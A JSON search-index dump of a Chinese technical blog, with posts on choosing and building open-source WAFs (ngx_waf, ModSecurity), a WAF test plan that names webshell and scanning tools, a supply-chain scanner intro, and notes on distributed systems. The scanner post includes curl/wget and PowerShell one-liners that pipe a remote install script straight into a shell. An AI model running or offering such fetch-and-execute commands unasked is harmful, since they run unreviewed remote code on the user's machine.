（2.0.0）\nOWASP\n\n\n数据展示-Grafana\n","slug":"开源WAF选型-coraza","date":"2022-06-07T08:43:50.255Z","categories_index":"开源WAF产品选型","tags_index":"WAF,Nginx,开源WAF产品选型,modsecurity,安全建设","author_index":"Moses"},{"id":"d83ed4274a56feb5fee348cbe5357a10","title":"开源WAF调研之产品选型-Ngx_Waf","content":"产品信息简介\n\n\n名称\n开源协议\n开发语言\n开源时间\n活跃度\n代码质量\n最新版本\n厂商\n\n\n\nngx_waf\nBSD 3-Clause License\nC\n2020-08-18（1.0.0）\n983⭐️\nA\n2022-01-07 （6.1.8）\n个人开发者\n\n\n产品描述方便、高性能、兼容 ModSecurity 的 Nginx 防火墙模块.实现基础的防护，即 IP 检测、Url 检测、Get 参数检测、Cookie 检测、Post 检测、Referer 检测和 CC 防御.具体参考开发者blognginx 防火墙模块开发总结\n安装兼容性说明\n操作系统：Linux\nNginx兼容：本模块只保证对 nginx-1.18.0 或更新的版本的兼容性。\n模块兼容性问题：本模块与 ngx_http_rewrite_module (opens new window)存在兼容性问题。\n\n静态模块\n\n\n\n\n\n\n\n\n注意编译安装模块可能需要一些依赖，比如 gcc，请自行解决依赖问题，本文不提供这类信息。\n重要信息\n\n\n\n\n\n\n\n\n\n编译安装一个新的模块需要知道当前的 nginx 的 configure 脚本的参数，您可以通过运行 nginx -V 来获取。 下面是一个例子。\nnginx version: nginx&#x2F;1.19.6\nbuilt by gcc 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)\nbuilt with OpenSSL 1.1.1i  8 Dec 2020\nTLS SNI support enabled\nconfigure arguments: --with-mail&#x3D;dynamic --with-openssl&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;openssl-OpenSSL_1_1_1i --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx --user&#x3D;nginx --group&#x3D;nginx --with-file-aio --with-http_ssl_module --with-http_geoip_module --with-http_v2_module --with-http_realip_module --with-stream_ssl_preread_module --with-http_addition_module --with-http_xslt_module&#x3D;dynamic --with-http_image_filter_module&#x3D;dynamic --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_random_index_module --with-http_secure_link_module --with-http_degradation_module --with-http_slice_module --with-http_perl_module --with-http_stub_status_module --with-http_auth_request_module --with-mail&#x3D;dynamic --with-mail_ssl_module --with-pcre --with-pcre-jit --with-stream&#x3D;dynamic --with-stream_ssl_module --with-debug --with-cc-opt&#x3D;&#39;-O3 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE&#x3D;2 -fexceptions -fstack-protector-strong --param&#x3D;ssp-buffer-size&#x3D;4 -grecord-gcc-switches -m64 -mtune&#x3D;generic&#39;\n\n务必记住 configure arguments: 后面的内容，下文中将使用 ARG 来代替这块内容。\n\n首先下载对应版本的 nginx，下载页面 (opens new window)。 下面将以 nginx-1.20.1 为例。cd &#x2F;usr&#x2F;local&#x2F;src\nwget https:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.20.1.tar.gz\ntar -zxf nginx-1.20.1.tar.gz\n然后下载本模块的源码，下文将使用稳定版的源码。cd &#x2F;usr&#x2F;local&#x2F;src\ngit clone -b lts https:&#x2F;&#x2F;github.com&#x2F;ADD-SP&#x2F;ngx_waf.git\n接下来应该运行配置脚本。cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;nginx-1.20.1\n.&#x2F;configure ARG --add-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_waf\nsed -i &#39;s&#x2F;^\\(CFLAGS.*\\)&#x2F;\\1 -fstack-protector-strong -Wno-sign-compare&#x2F;&#39; objs&#x2F;Makefile\n开始编译# 不使用并行编译\nmake\n\n# 使用并行编译\nmake -j$(nproc)\n关闭 nginx，然后替换 nginx 的二进制文件， 此处假设 nginx 的二进制文件的绝对路径为 /usr/local/nginx/sbin/nginx。cp objs&#x2F;nginx &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx\n\n\n\n\n\n\n\n\n\n热部署如果您不想在替换二进制文件时关闭 nginx，可以参考官方文档的热部署方案 (opens new window)。\n\n\n动态模块下载预构建的模块您可以通过执行脚本 assets/download.sh 来下载动态模块。下面是一些用例。\n# 用于 nginx-1.20.1 的 LTS 版的模块\nsh assets&#x2F;download.sh 1.20.1 lts\n\n# 用于 nginx-1.21.1 的 LTS 版的模块\nsh assets&#x2F;download.sh 1.21.1 lts\n\n# 用于 nginx-1.20.1 的最新版的模块\nsh assets&#x2F;download.sh 1.20.1 current\n\n# 用于 nginx-1.21.1 的最新版的模块\nsh assets&#x2F;download.sh 1.21.1 current\n\n执行脚本后你会看到类似下面这样的输出。\nchecking for command ... yes\nchecking for libc implementation ... yes\n + GNU C libary\nPulling remote image addsp&#x2F;ngx_waf-prebuild:ngx-1.21.1-module-beta-glibc\n......\n......\n......\nDownload complete!\n\n如果你看到 Download complete! 则说明下载成功，模块会被保存在当前目录下。 你可以将其拷贝到一个目录下，然后在 nginx.conf 的顶部添加一行。\nload_module &quot;&#x2F;path&#x2F;to&#x2F;ngx_http_waf_module.so&quot;;\n\n然后关闭 nginx 并运行 nginx -t。如果没有出错则说明模块被正常加载，反之则说明您的 nginx 不支持预构建的模块，请编译安装模块。\n编译动态模块编译安装动态模块并不需要重新编译整个 nginx，只需要重新编译所有的模块，所以 速度相对静态模块快一些，这也是本文档推荐的方式。\n下载 nginx 源码和模块源码的过程同静态模块，不再赘述。\n运行配置脚本\n.&#x2F;configure --add-dynamic-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_waf --with-compat\nsed -i &#39;s&#x2F;^\\(CFLAGS.*\\)&#x2F;\\1 -fstack-protector-strong -Wno-sign-compare&#x2F;&#39; objs&#x2F;Makefile\n\n然后开始编译动态模块\nmake modules\n\n接着您应该关闭 nginx，然后将动态模块拷贝到模块目录， 此处假设模块目录的绝对路径为 /usr/local/nginx/modules。\ncp objs&#x2F;*.so &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules\n\n最后在 nginx 的配置文件顶部添加一行\nload_module &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules&#x2F;ngx_http_waf_module.so&quot;;\n\n\ncd &#x2F;usr&#x2F;local&#x2F;src \\\n        &amp;&amp;  wget https:&#x2F;&#x2F;github.com&#x2F;maxmind&#x2F;libmaxminddb&#x2F;releases&#x2F;download&#x2F;1.6.0&#x2F;libmaxminddb-1.6.0.tar.gz -O libmaxminddb.tar.gz         &amp;&amp;  mkdir libmaxminddb \\\n        &amp;&amp;  tar -zxf &quot;libmaxminddb.tar.gz&quot; -C libmaxminddb --strip-components&#x3D;1 \\\n        &amp;&amp;  cd libmaxminddb \\\n        &amp;&amp;  .&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;libmaxminddb \\\n        &amp;&amp;  make -j $(nproc) \\\n        &amp;&amp;  make install \\\n        &amp;&amp;  cd &#x2F;usr&#x2F;local&#x2F;src \\\n        &amp;&amp;  git clone -b v3.0.5 https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity.git \\\n        &amp;&amp;  cd ModSecurity \\\n        &amp;&amp;  chmod +x build.sh \\\n        &amp;&amp;  .&#x2F;build.sh \\\n        &amp;&amp;  git submodule init \\\n        &amp;&amp;  git submodule update \\\n        &amp;&amp;  .&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;modsecurity --with-maxmind&#x3D;&#x2F;usr&#x2F;local&#x2F;libmaxminddb \\        \n\t\t&amp;&amp;  make -j $(nproc) \\ \\\n        &amp;&amp;  make install \\\n        &amp;&amp;  export LIB_MODSECURITY&#x3D;&#x2F;usr&#x2F;local&#x2F;modsecurity \\\n        &amp;&amp;  cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;nginx-1.22.0\n\n\nModSecurity - v3.0.5 for Linux\n\n Mandatory dependencies\n   + libInjection                                  ....v3.9.2-46-gbfba51f\n   + SecLang tests                                 ....a3d4405\n\n Optional dependencies\n   + GeoIP&#x2F;MaxMind                                 ....found\n      * (MaxMind) v\n         &#x2F;usr&#x2F;local&#x2F;libmaxminddb&#x2F;lib&#x2F;&#x2F;libmaxminddb.so, &#x2F;usr&#x2F;local&#x2F;libmaxminddb&#x2F;include, -DWITH_MAXMIND -I&#x2F;usr&#x2F;local&#x2F;libmaxminddb&#x2F;include\n   + LibCURL                                       ....not found\n   + YAJL                                          ....not found\n   + LMDB                                          ....not found\n   + LibXML2                                       ....not found\n   + SSDEEP                                        ....not found\n   + LUA                                           ....not found\n\n Other Options\n   + Test Utilities                                ....disabled\n   + SecDebugLog                                   ....enabled\n   + afl fuzzer                                    ....disabled\n   + library examples                              ....enabled\n   + Building parser                               ....disabled\n   + Treating pm operations as critical section    ....disabled\n\n\n备注\n\n测试服务器集群都安装了Nginx服务，需要使用虚拟机搭建\n安装Nginx参照Nginx1.22.0安装\n自研WAF之路——Modsecurity安装教程 - FreeBuf网络安全行业门户\nModSecurity停止维护\n\n参考ModSecurity中文社区自研WAF之路——Modsecurity安装教程 - FreeBuf网络安全行业门户\n","slug":"开源WAF选型-Ngx_waf","date":"2022-06-07T02:48:17.348Z","categories_index":"开源WAF产品选型","tags_index":"WAF,Nginx,开源WAF产品选型,安全建设","author_index":"Moses"},{"id":"cbb2976f11ff7fb8777c04992cf59470","title":"开源WAF调研之产品选型","content":"拆解课题开源WAF产品调研\n本周完成，甄选3-5款开源WAF产品，并输出调研报告\n1-2周完成测试环境搭建\n\n选品选型评估&#x3D;&gt; 评估报告中应包含开源WAF的功能、稳定性、扩展性评估。&#x3D;&gt; 评估报告应包含关键功能、性能指标的比较\n需求分析1.禁止国外IP访问\n\n\n\n\n\n\n\n\n不存在国外业务，原有阿里云禁止国外IP访问所有业务系统。\n\n 对策：使用Nginx 的 ngx_http_geoip2  参考https://mp.weixin.qq.com/s/H_eOPAUUytH_FPsxz3OC7g\n 难点：IP地址库的定期更新维护\n\n2.IP黑白名单\n 对策：参考使用ipblocks\n 难点：同上\n\n3.OWASP Top10 漏洞检测防御\n 准备：靶场环境、测试工具、手动验证\n 对策：使用ModSecurity +owasp-modsecurity-crs\n 难点：防护能力待验证，CRS最近版本是2019年版\n\n4.Bot5.CC6.dashboard\n 对策：Nginx Ngx_waf 均没有dashboard Janusec有\n 难点：自建前端技术挑战较大\n\n7.WAF自定义规则\n 对策:Ngx_waf ModSecurity均支持配置语法；Janusec支持正则表达式\n 难点：ModSecurity 语法ModSecurity中文手册与正则表达式均存在学习成本 Google RE2 正则表达式\n\n产品调研一、ngx_wafngx_waf\n\n Ngx_WAF选型可研报告 ✅ 2022-06-10[[开源WAF选型-Ngx_waf]]\n\n二、janusec安全开源 - JANUSEC-数据安全与隐私保护\n\n Janusec选型可研报告 ✅ 2022-06-10[[开源WAF选型-Janusec]]\n\n三、CorazaOWASP Coraza WAF - Enterprise-grade open source web application firewall library\n\n Coraza选型可研报告\n\n[[开源WAF选型-coraza]]\n四、api-firewallAPI Firewall overview - Wallarm Documentation\n五、Awesome-WAFAwesome Search\n六、WallarmWAF for Kubernetes | API Security for K8s ☝️ | Wallarm是面向K8S的API安全网关和下一代WAF，目前基于提供SAAS服务，免费试用14天。注册地址服务器再EU和US，面临费用和网络的双重问题暂时不考虑。doc\n七、ModSecurityModSecurity \n\n ModSecurity选型可研报告 ✅ 2022-06-10\n\n[[开源WAF选型-Nginx+ModSecurity3.0]]\n产品选型WAF产品列表-from whatwaf360 Web Application Firewall (360)\naeSecure (WAF)\nAirlock (Phion&#x2F;Ergon)\nAkamaiGHost Website Protection (Akamai Global Host)\nAlert Logic (SIEMless Threat Management)\nAliYunDun (WAF)\nAnquanbao Web Application Firewall (Anquanbao)\nAnYu Web Application Firewall (Anyu Technologies)\nApache Generic\nArmor Protection (Armor Defense)\nApplication Security Manager (F5 Networks)\nASP.NET Generic Website Protection (MS)\nApache Traffic Server (ATS web proxy)\nAmazon Web Services Web Application Firewall (Amazon)\nYunjiasu Web Application Firewall (Baidu)\nBarikode Web Application Firewall\nBarracuda Web Application Firewall (Barracuda Networks)\nBekchy (WAF)\nBIG-IP (F5 Networks)\nBinarySEC Web Application Firewall (BinarySEC)\nBitninja (WAF)\nBlockDos DDoS protection (BlockDos)\nChuangyu top government cloud defense platform (WAF)\nCisco ACE XML Firewall (Cisco)\nCloudFlare Web Application Firewall (CloudFlare)\nCloudFront Firewall (Amazon)\nXSS&#x2F;CSRF Filtering Protection (CodeIgniter)\nComodo Web Application Firewall (Comodo)\nIBM Websphere DataPower Firewall (IBM)\nDeny All Web Application Firewall (DenyAll)\nDiDiYun WAF (DiDi)\nDoD Enterprise-Level Protection System (Department of Defense)\nDOSarrest (DOSarrest Internet Security)\ndotDefender (Applicure Technologies)\nDynamicWeb Injection Check (DynamicWeb)\nEdgeCast Web Application Firewall (Verizon)\nExpressionEngine (Ellislab WAF)\nFortiWeb Web Application Firewall (Fortinet)\nGladius network WAF (Gladius)\nGoogle Web Services\nGrey Wizard Protection\nIncapsula Web Application Firewall (Incapsula&#x2F;Imperva)\nINFOSAFE by http:&#x2F;&#x2F;7i24.com\nInstart Logic (Palo Alto)\nJanusec Application Gateway (WAF)\nJiasule (WAF)\nLitespeed webserver Generic Protection\nMalcare (MalCare Security WAF)\nOpen Source Web Application Firewall (Modsecurity)\nMod Security (OWASP CSR)\nNexusGuard Security (WAF)\nNginx Generic Protection\nPalo Alto Firewall (Palo Alto Networks)\nAnti Bot Protection (PerimeterX)\npkSecurityModule (IDS)\nPowerful Firewall (MyBB plugin)\nRadware (AppWall WAF)\nRSFirewall (Joomla WAF)\nSabre Firewall (WAF)\nSafeDog WAF (SafeDog)\nSecuPress (Wordpress WAF)\nShadow Daemon Opensource (WAF)\nShield Security\nWebsite Security SiteGuard (Lite)\nSonicWALL Firewall (Dell)\nSquid Proxy (IDS)\nStingray Application Firewall (Riverbed&#x2F;Brocade)\nStrictHttpFirewall (WAF)\nSucuri Firewall (Sucuri Cloudproxy)\nTeros Web Application Firewall (Citrix)\nUEWaf (UCloud)\nUrlScan (Microsoft)\nVarnish&#x2F;CacheWall WAF\nViettel WAF (Cloudrity)\nWallarm WAF\nWebKnight Application Firewall (AQTRONIX)\nIBM Security Access Manager (WebSEAL)\nWest236 Firewall\nWordfence (Feedjit)\nWTS-WAF (Web Application Firewall)\nXuanwudun WAF\nYundun Web Application Firewall (Yundun)\nYunsuo Web Application Firewall (Yunsuo)\nZscaler Cloud Firewall (WAF)\n\n\n\n\n\n打分表\n\n\n产品名称\n技术挑战性\n技术影响力\n市场覆盖度\n产品符合度\n\n\n\nJanusec\n40\n30\n30\n30\n\n\nModSecurity\n60\n50\n50\n50\n\n\nNgx_waf\n60\n45\n30\n40\n\n\ncoraza\n\n\n\n\n\n\n关键指标-通用产品描述略\n技术描述市场竞争对手Funding Rounds关键指标-技术\n\n\n关键功能对比\n是否具备能力\n备注\n\n\n\nSQL注入\n\n\n\n\nCC防御\n\n\n\n\nBot\n\n\n\n\n业务逻辑攻击\n\n\n\n\nOWASP TOP10\n\n\n\n\n跨站脚本攻击\n\n\n\n\n敏感数据泄露\n\n\n\n\n产品测试功能测试搭建测试靶场搭建pikachu靶场使用[[资料整理-红队资料集锦#学习靶场]]中的pikachu作为后端服务进行测试，pikachu是PHP开发的web安全测试靶场，docker部署存在问题，后续可以使用其他靶场如DVWA进行测试。💡问题已解决：\n1. 修改dockerfile镜像 将第一行改为FROM mattrayner&#x2F;lamp:latest-1604-php5\n2. 修改pkxss&#x2F;inc&#x2F;config.inc.php 配置文件中的MySQL密码 设置与镜像一直 为空\nDVWA靶场\n 待安装测试\n\n工具测试\n使用OWASP ZAP 进行OWASP Top 10 漏洞测试\n使用AWVS进行web安全测试\n使用poc测试 如log4j springcore 等\n使用clash进行进行IP黑白名单测试\nCC攻击\n使用Python burpsuite 浏览器等验证SSL指纹测试\n使用🔪🐜哥斯拉等上传webshell 内存马等进行测试\n测试WAF五元组以及Content-type结合WAF规则集进行验证\n\n性能测试ngx_waf性能测试测试 | ngx_wafwrkNginxTestl\ncoraza性能测试Benchmarks - OWASP Coraza WAF\n参考Test and evaluate your WAF before hackers ☝️对抗工具whatwafGitHub - acouvreur&#x2F;traefik-modsecurity-plugin: Traefik plugin to proxy requests to owasp&#x2F;modsecurity-crs:apache containeripblocks2021年十大开源waf - 知乎Traefik Modsecurity PluginPikachu漏洞练习平台实验——暴力破解（一） - 那少年和狗 - 博客园Pikachu漏洞练习平台实验——XSS（二） - 那少年和狗 - 博客园Pikachu漏洞练习平台实验——CSRF（三） - 那少年和狗 - 博客园Pikachu漏洞练习平台实验——SQL注入（四） - 那少年和狗 - 博客园Pikachu漏洞练习平台实验——RCE（五） - 那少年和狗 - 博客园Pikachu漏洞练习平台实验——文件包含（File Inclusion）（六） - 那少年和狗 - 博客园Pikachu漏洞练习平台实验——不安全的文件下载和上传（七） - 那少年和狗 - 博客园Pikachu漏洞练习平台实验——越权漏洞（八） - 那少年和狗 - 博客园Pikachu漏洞练习平台实验——php反序列化、XXE、SSRF（九） - 那少年和狗 - 博客园\n","slug":"开源WAF选型","date":"2022-06-06T09:53:28.000Z","categories_index":"开源WAF产品选型","tags_index":"WAF,Nginx,开源WAF产品选型,安全建设","author_index":"Moses"},{"id":"f48e91bff7d0e96d07d9f87de6bb94df","title":"软件供应链安全分析工具-墨菲","content":"软件供应链安全-墨菲安全简介墨菲安全的 CLI 工具，用于在命令行检测指定目录代码的依赖安全问题，也可以基于 CLI 工具实现在 CI 流程的检测。\n支持的语言\n\n\n语言\n包管理工具\n支持情况\n❗️完整检测的环境要求\n\n\n\nJava\nMaven\n✅\n可通过 Maven 在本地成功构建项目\n\n\nJava\nGradle\n✅\n可通过 Gradle 在本地成功构建项目\n\n\nGo\ngovendor\n✅\n可通过 Go 在本地成功构建项目\n\n\nJavaScript\nnpm\n✅\n无要求\n\n\nJavaScript\nyarn\n✅\n无要求\n\n\nPython\npip\n✅\n无要求\n\n\nPHP\nComposer\n✅\n无要求\n\n\nPython\npipenv\n即将支持\n-\n\n\n.NET\nNuget\n即将支持\n-\n\n\nSwift、Objective-C\nCocoaPods\n即将支持\n-\n\n\nRuby\nBundler\n即将支持\n-\n\n\n工作原理\n对于使用不同语言&#x2F;包管理工具的项目，墨菲安全的 CLI 工具主要采用项目构建或直接对包管理文件进行解析的方式，来准确获取到项目的依赖信息\n项目的依赖信息会上传到服务端，并基于墨菲安全持续维护的漏洞知识库来识别项目中存在安全缺陷的依赖\n\n\n使用场景\n希望在本地环境中检测代码文件\n希望集成到 CI 环境中对代码项目进行检测\n\n参考：墨菲安全 CLI 与 Jenkins CI 的集成\nQuickstartlinux\nwget -q https:&#x2F;&#x2F;s.murphysec.com&#x2F;install.sh -O - | &#x2F;bin&#x2F;bash\nMacOS\ncurl -fsSL https:&#x2F;&#x2F;s.murphysec.com&#x2F;install.sh | &#x2F;bin&#x2F;bash\nWindows\npowershell -Command &quot;iwr -useb https:&#x2F;&#x2F;s.murphysec.com&#x2F;install.ps1 | iex&quot;\n\n对比[[使用snyk检查开源软件依赖中的漏洞.md]]\nReferences官方文档墨菲安全 | 为您提供专业的软件供应链安全管理\n","slug":"软件供应链安全-墨菲安全","date":"2022-05-29T12:26:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,软件成分分析工具,墨菲安全","author_index":"Moses"},{"id":"1ab18743769cc5b4fe58b2f1026856c9","title":"分布式系统学习","content":"直观的感受区块链\n比特币\n以太坊\n\n\n\n\n\n\n\n\n一个词来描述分布式系统：分而治之\n\n\n分布式系统的前世今生分布式系统看起来就像一个计算机。计算机包括五大体系结构（即冯诺依曼结构），它有五大部件：分别是控制器、运算器、存储器、输入及输出。 你可以这么理解：一个分布式系统也包含这五大部件，其中最重要的是计算与存储。计算与存储由一系列网络节点组成，每个节点之间的通信就是输入与输出，各节点之间的调度管理就是控制器。\n\n存储器 ，即分布式存储系统，如 NoSQL 数据库存储；[[分布式系统#分布式存储]]\n\n运算器 ，即分布式计算，如分布式并行计算；[[分布式系统#分布式计算]]\n\n输入输出 ，即分布式系统通信，如同步 RPC 调用和异步消息队列；[[分布式系统#分布式消息队列]]\n\n控制器 ，即调度管理，如流量调度、任务调度与资源调度。如Quartz、XXL-JOB、Elastic-Job、Apache DolphinScheduler[[Centos7安装azkaban]]等\n\n\nC&#x2F;S 架构和 B&#x2F;S 架构\n\n\n\n\n\nC&#x2F;S 缺点\n平台兼容性Windows，Linux\n例如有些只能运行在 windows 上，需针对不同的平台开发不同的版本\n版本更新和版本兼容性\n大型网络游戏，更新的期间，必须完成才能继续游戏。魔兽世界，原神\n业务安全：例如吃鸡，各种运行在客户端的外挂\n\nB&#x2F;S 缺点\n业务逻辑在后端服务器执行，需要服务提供方提供已将资源。\n\n边界CAP理论：  C（Consistency）是数据一致性、A（Availability）是服务可用性、P（Partition tolerance）是分区容错性。C、A、P 只能同时满足两个目标，而由于在分布式系统中，P 是必须要保留的，所以要在 C 和 A 间进行取舍。假如要保证服务的可用性，就选择 AP 模型，而要保证一致性的话，就选择 CP 模型。\n理论理解现在有一个分布式系统 A，它有一个副本 A1，在正常情况下，客户端 Client 写数据到系统 A，然后数据从 A 节点同步到 A1 节点，再返回给 Client 成功状态。这时，客户端 Client 从任何节点 A 或 A1 读取数据，都能读取到最新写入的数据，说明 A 和 A1 的数据是一致的，并且 A 和 A1 也都是可用的。但由于网络是不可靠的，节点 A 和 A1 的网络随时会因为中断而出现分区。所谓网络分区就是由于网络不通导致节点 A 和 A1 被隔离在不同的网络子集中，此时节点 A 的数据就不能及时同步到节点 A1 中了。在分布式系统中，由于网络问题导致的网络分区是常态。也就是说出现网络分区时，根据 CAP 理论，需要在 A 和 C 中进行取舍，即要么保证系统的可用性，要么保证数据一致性。\n分布式系统的前提软件按照既定的设计方案正常运行的情况下，解决复杂的业务场景。\n\n既定的设计方案会考虑  - 网络异常。  - 服务器宕机。  - 进程崩溃等。\n既定的世界方案不考虑  - 人为的恶意修改，例如恶意攻击。  - 代码漏洞。\n概念\n建立在网络之上的软件系统。\n软件组件分布在不同的网络计算机上。\n软件组件之间的通信通过网络来完成。\n\n\n\n分布式系统的扩展x轴方向扩展\n解决的问题为了解决单机无法满足大量并发请求。\n特点\n对同一个应用扩展出多个副本。\n需要配置负载均衡将压力分散到不同的副本，可以将请求分发到任意一个副本。\n需要应用是无状态的，即可以随时下线，可以随时扩展出新的副本。\n\n瓶颈 负责管理状态的数缓存或者数据库这一层的处理能力会逐渐达到上线，通用需要可以水平扩展。\ny轴方向扩展解决的问题为了解决x周扩展的数据缓存层和数据库层的处理能力的上限，支持数据库的水平扩展。\n特点\n按照业务领域拆分成多个应用。\n例如在电商系统中，商品详情页可能就是一个独立的子系统，有多层应用服务器、多层缓存机制、多个数据库组成，并且由一个庞大的部门独立维护者。\n\n瓶颈** 即便是按业务领域拆分后，某个极小的领域仍旧有海量数据要管理，数据库仍旧有瓶颈。例如大型电商的订单系统。**\nz轴方向扩展解决的问题解决拆分的某一个极小业务领域的海量数据无法靠单个数据库承载的问题。\n特点\n对某一领域的数据做分片。\n需要有数据读写的分片路由规则。\n分片的动态扩展。\n\n瓶颈 🤦‍♂️如何把数据保存到多台服务器上\n\n1.仍旧视同关系型数据库，做分库分表。这种架构的难点是当分库分表规则发生变化时的数据迁移问题。\n数据迁移：\n全量的数据迁移，分片路由算法一般是根据某个id取余。\n部分数据的迁移，分片路由算法可以用一致性哈希。\n\n\n数据查询：\n有些复杂查询，会在多个数据库服务器上执行sql，然后合并执行结果，需要处理各种异常。\n像分页等查询，涉及到大量数据的归并，存在效率问题。\n\n\n开源数据库中间件\n仅在编码层面解决了面向多数据编程的问题，核心思路仍旧是多个sql在不同的数据库服务器上执行。\n\n\n最重要的一个难题是，这种架构保证数据的一致性很有挑战。\n\n\n2.放弃SQL的便利性，采用分布式文件系统保存海量数据。\n可以使用HDFS存储数据，HDFS提供了可靠的数据存储能力和强一致性。\n\n\n3.在在线服务(OLTP)方面，我们可以采用NoSQL数据库来存储数据。\n4.使用NewSQL数据库。NewSQL并没有去掉对SQL的支持，同时具备良好的水平扩展能力、可靠性和可用性。\n当系统在z轴上支持水平扩展后，整个系统就彻底成为一个分布式系统。\n\n\n\n分布式系统现状\n目前应用层的分布式技术已经相对成熟，虚拟化技术、容器技术（Docker），网格服务（service mesh）已经成熟并且大面积落地。\n相对而言，数据库分布式技术的成熟度远不如应用程程序的分布式技术，大部分公司仍旧以分库分表为主。\n无论哪一种数据层的分布式技术，最难的攻克莫过于分布式系统的一致性。\n\n分布式系统面临的问题\n通信异常：网络本身是不可靠的。\n网络分区：网络与网络之间出现无法通信的情况，但是子网内部的网咯是正常的。\n节点故障：硬件故障，节点的操作系统崩溃。\n三种请求应答状态：成功，失败和超时。\n\n分布式式系统的一致性 定义： 分布式数据一致性是指，数据在不同的节点上存在多个副本时，各副本的数据是一致的，即相同副本的数据无差异。\n\n\n\n\n\n\n\n\n\n BASE 理论，它是 CAP 理论的延伸。BASE 是 Basically Available（基本可用）、Soft State（软状态）和 Eventually Consistent（最终一致性）三个单词的简写，作用是保证系统的可用性，然后通过最终一致性来代替强一致性，它是目前分布式系统设计中最具指导意义的经验总结。\n分类强一致性 要求对分布式系统写入A，从分布式系统中读出的也是A。即存在一个全局性的写入，读取的严格先后顺序。\n弱一致性\n读写一致性： 保证用户能够第一时间读取到自己更改的数据。\n单调读一致性： 当前读到的数据，不能比上次到的数据旧，却不要求当前读到的一定是最新的。\n因果一致性：当节点A在更新完数据X&#x3D;10通知到B节点，那么B节点之后针对X的读取和修改都需要基于X&#x3D;10这个前提下，同时，如果A节点未同步X&#x3D;10到C节点，C节点在读取X时，不受X&#x3D;10这个前提限制。\n最终一致性：顾名思义，数据在不同的节点间，经过一定的时间后，最终会达成一致。\n\n实践BASE 中的基本可用指的是保障核心功能的基本可用，其实是做了“可用性”方面的妥协，比如：\n\n电商网站在双十一大促等访问压力较大的时候，关闭商品排行榜等次要功能的展示，从而保证商品交易主流程的可用性，这也是我们常说的服务降级；\n\n为了错开双十一高峰期，电商网站会将预售商品的支付时间延后十到二十分钟，这就是流量削峰；\n\n在你抢购商品的时候，往往会在队列中等待处理，这也是常用的延迟队列。软状态和最终一致性指的是允许系统中的数据存在中间状态，这同样是为了系统可用性而牺牲一段时间窗内的数据一致性，从而保证最终的数据一致性的做法。\n\n\n目前这种处理数据的方式几乎成了互联网的标配设计模式，最经典的例子是在用户下单的时候不需要真正地扣减库存，而是仅在前台计个数，然后通过异步任务在后台批量处理。\n分布式事务\n要满足事务的基本特性ACID\n分布式事务相对于本地事务而言，表现形式会有所不同。\n\n分布式系统分类分布式存储Google 文件系统操作与职责\n创建元数据，例如文件的位置，大小，名称等交给 master 来处理。\n写数据交给 chunk server 来处理，client 直接提交 数据给 chunk server。\n通过 primary replica 来控制 chunk server对某个数据文件的并发写入。\n\nGFS 松弛一致性\n一致性的解释：client 无论从哪个副本读取数据，看到的总是相同的数据，这称为一致性。\n元数据的一致性\n文件数据的一致性\n\nHDFS（Hadoop Distributed File System）HDFS 的架构\nHDFS 的 pipeline  \n分布式数据库Google 的 BigTable\nBigTable 的数据模型\n\n带时间戳的 BigTable 数据模型\n\n行级原子性\n\nBigTable 的架构\n\nGFS\nchubby\nGoogle 公司内部的分布式锁服务。\n\n\nclient\nmaster\n负责把一个 tablet 指派给一个 tablet server\n\n\ntablet server\nBigTable 会为每个 tablet 指定一个 tablet server\n\n\n\n\nHBase [[020-bigdata&#x2F;数据仓库&#x2F;HBase&#x2F;HBase]]\n\nMongoDB\n\n\n分布式计算\nHadoop（Map Reduce）\nSpark（批处理 + 实时处理）\nFlink（实时处理）\n\n分布式消息队列\nKafka\nRabbitMQ\nRocketMQ\n\n分布式机器学习\nSpark ML\n分布式 TensorFlow\n\n携程架构实践\n","slug":"分布式系统","date":"2022-05-05T07:42:08.000Z","categories_index":"分布式","tags_index":"分布式数据库,分布式存储,分布式计算,架构学习","author_index":"Moses"},{"id":"413e999854a8918e45b13a69d229a398","title":"熔断、超时、限流和服务降级的概念梳理","content":"服务熔断解决的问题\n解决微服务架构下，系统间调用链路的雪崩，避免造成整个微服务体系崩溃。类似电路过载的保险丝。\n技术、架构类问题的解决方案，多数研发和运维参与。\n从局部出发，各自解决问题，被动防御。\n\n造成链路调用雪崩的原因\n调用链的某一环节，例如APP-D出现性能瓶颈，导致依赖该环节的前置业务系统长时间无法获得获得响应，无法释放资源，随着请求数量不断增加，占用的资源会越来越多，最终导致整个微服务系统崩溃。  \n\n现有的实现方案\nSpringCloud 框架，通过 Hystrix 实现。Hystrix 会监控对微服务的调用情况，当针对某一微服务的调用失败次数达到阈值时（例如 5 秒内 20 次失败），就会启动熔断保护。\nIstio envy 熔断[[istio]]\n其他设计考量\n如何判被调用的某个微服务是不稳定的？\n在某个微服务稳定后，如何退出熔断保护？\n\n\n\n服务超时解决的问题在请求使用某一资源时，请求方有对从发出请求到获得资源的时间长短，有容忍度的区间上限。不避免在一件事情上过渡消耗资源，及时止损。\n分类    - 建立连接超时\n    - 写入、读取数据超时\n\n举例描述\n不超时通俗举例：望夫崖，一等等千千万万载，风雨中，边化作石块。\n超时举例：假如非要给这份爱情加上一个期限的话，我希望是一万年。只是超时时间比较长😅\n\n服务限流解决的问题\n抽象描述:某个或某类资源有限且往往在使用这些资源时是独占的，在短时间内出现大量申请（高并发）使用资源的请求，会因无法及时分配和回收资源，导致业务阻塞，并进一步加剧使用资源请求的频次和数量，最终导致系统崩溃。\n场景\n合理，重要的资源申请被淹没。  